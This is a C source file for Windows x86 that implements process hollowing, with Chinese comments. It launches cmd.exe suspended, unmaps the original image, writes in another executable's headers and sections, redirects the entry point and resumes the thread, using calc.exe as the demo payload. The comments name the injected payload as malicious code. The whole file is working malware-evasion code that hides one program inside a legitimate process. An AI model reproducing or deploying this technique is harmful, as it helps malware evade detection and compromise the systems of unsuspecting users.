#include "header.h"

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL hollowing(char path[]) {

	PVOID FileBuffer;
	HANDLE hFile;
	DWORD FileReadSize;
	DWORD dwFileSize;

	PVOID RemoteImageBase;			//peb中可执行映像的基址
	PVOID RemoteProcessMemory;		//镂空进程中分配的内存空间

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };			//进程句柄修改内存空间
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	si.cb = sizeof(si);
	//创建一个挂起的进程
	BOOL bRet = CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	//给恶意代码分配内存空间
	hFile = CreateFileA(path, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	dwFileSize = GetFileSize(hFile, NULL);
	FileBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//将磁盘文件读取到申请的内存空间
	ReadFile(hFile, FileBuffer, dwFileSize, &FileReadSize, NULL);
	CloseHandle(hFile);

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader->e_lfanew);
	PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNtHeader) + 4);
	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);
	PIMAGE_SECTION_HEADER pSectionHeader;

	//获取挂起进程的线程上下文
	GetThreadContext(pi.hThread, &ctx);

	//x86环境从ebx寄存器中获取peb地址，并从peb中目标进程的基址(偏移8个字节)到RemoteImageBase
	//可选头中的imagebase
	ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);

	//判断文件预期加载地址是否被占用
	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
	//挖空已加载的地址
	if ((SIZE_T)RemoteImageBase == pNtHeader->OptionalHeader.ImageBase)
		NtUnmapViewOfSection(pi.hProcess, RemoteImageBase);

	//为可执行映像分配新内存，并写入文件头
	RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pOptionHeader->ImageBase, pOptionHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileBuffer, pOptionHeader->SizeOfHeaders, NULL);

	//逐段写入
	for (int i = 0; i < pPEHeader->NumberOfSections; i++)
	{
		pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)FileBuffer + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + i * sizeof(IMAGE_SECTION_HEADER));
		WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeader->VirtualAddress), (PVOID)((LPBYTE)FileBuffer + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
	}

	//更改程序入口点
	ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pOptionHeader->AddressOfEntryPoint);
	WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pOptionHeader->ImageBase, sizeof(PVOID), NULL);

	//设置线程上下文
	SetThreadContext(pi.hThread, &ctx);
	//恢复挂起线程
	ResumeThread(pi.hThread);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return TRUE;
}

int main(int argc, char* argv[]) {
	char path[] = "C:\\windows\\syswow64\\calc.exe";
	hollowing(path);
	return 0;
}